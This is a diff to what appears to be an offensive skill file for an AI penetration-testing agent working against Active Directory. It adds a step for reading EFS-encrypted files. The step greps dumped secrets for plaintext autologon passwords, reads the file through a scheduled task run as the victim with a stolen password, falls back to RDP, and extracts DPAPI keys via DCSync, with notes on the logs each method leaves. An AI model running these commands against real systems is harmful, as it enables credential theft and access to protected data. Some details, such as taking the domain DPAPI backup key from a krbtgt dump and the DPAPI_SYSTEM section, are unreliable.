@@ -5,7 +5,7 @@ description: >
   database extraction, SAM hive dump, Azure AD Connect (ADSync) credential
   extraction, LAPS passwords (legacy + Windows LAPS), gMSA passwords (KDS
   root key + GoldenGMSA), dMSA exploitation (BadSuccessor CVE-2025-21293),
-  and DSRM credentials.
+  DSRM credentials, and EFS-encrypted file decryption.
 keywords:
   - DCSync
   - secretsdump
@@ -28,6 +28,11 @@ keywords:
   - krbtgt hash
   - hashdump
   - GoldenGMSA
+  - EFS
+  - Encrypting File System
+  - EFS encrypted
+  - DefaultPassword
+  - DPAPI backup key
   - KDS root key
   - dump credentials
   - dump domain
@@ -64,7 +69,7 @@ When an engagement directory exists:
 
 ## State Management
 
-Call `get_state_summary()` from the state-reader MCP server to read current
+Call `get_state_summary()` from the state MCP server to read current
 engagement state. Use it to:
 - Skip re-testing targets, parameters, or vulns already confirmed
 - Leverage existing credentials or access for this technique
@@ -706,7 +711,69 @@ secretsdump.py -hashes :DSRM_HASH 'DC_HOSTNAME/Administrator@DC_IP'
 - Changing DsrmAdminLogonBehavior to 2 is a persistence technique
 - Event 4657 (registry value modified) if changing logon behavior
 
-## Step 9: Escalate or Pivot
+## Step 9: EFS-Encrypted Files
+
+When a target file is EFS-encrypted (access denied despite admin/SYSTEM creds),
+PTH sessions (WinRM, psexec, wmiexec) won't work — they don't load the user's
+DPAPI keychain. You need a real interactive logon.
+
+### Check for Plaintext Credentials First
+
+```bash
+# DefaultPassword in LSA secrets = instant win (autologon cred)
+grep -i 'DefaultPassword\|DefaultUserName' engagement/evidence/secretsdump*.txt
+
+# Also check cached domain logon credentials in secretsdump output
+grep -i 'dpapi_machinekey\|NL\$KM' engagement/evidence/secretsdump*.txt
+```
+
+If you have a **plaintext password** for the file owner, use schtasks:
+
+### Scheduled Task Bypass (Preferred)
+
+schtasks with `/ru` `/rp` creates a real logon session that loads DPAPI keys,
+bypassing EFS restrictions that block PTH sessions.
+
+```cmd
+schtasks /create /tn "efs_read" /tr "cmd /c type C:\Users\target\secret.txt > C:\Windows\Temp\out.txt" /sc once /st 00:00 /ru DOMAIN\user /rp "password" /f
+schtasks /run /tn "efs_read"
+timeout /t 3
+type C:\Windows\Temp\out.txt
+schtasks /delete /tn "efs_read" /f
+del C:\Windows\Temp\out.txt
+```
+
+### RDP Fallback
+
+If schtasks fails or RDP is available (port 3389):
+
+```bash
+# RDP creates a full interactive logon — DPAPI loads naturally
+xfreerdp /v:TARGET /u:DOMAIN\\user /p:'password' /cert-ignore
+```
+
+### Manual DPAPI Decryption (Last Resort)
+
+Only if no plaintext password is available. Requires domain DPAPI backup key
+(from DCSync) or the user's master key.
+
+```bash
+# Extract domain backup key via DCSync
+secretsdump.py -k -no-pass DOMAIN/admin@DC -just-dc-user 'DOMAIN\krbtgt'
+# Backup key is in the DPAPI_SYSTEM section of secretsdump output
+
+# Use dpapick3 (in Docker image) for CAPI key container decryption
+# when impacket dpapi.py fails on CryptProtectData-wrapped containers
+start_process(command="dpapick3 ...", privileged=True)
+```
+
+### OPSEC Notes
+
+- schtasks creates Event 4698 (task created) + 4702 (task updated)
+- RDP creates Event 4624 type 10 (remote interactive logon)
+- DPAPI backup key extraction is covered by DCSync events
+
+## Step 10: Escalate or Pivot
 
 STOP and return to the orchestrator with:
 - What was achieved (RCE, creds, file read, etc.)
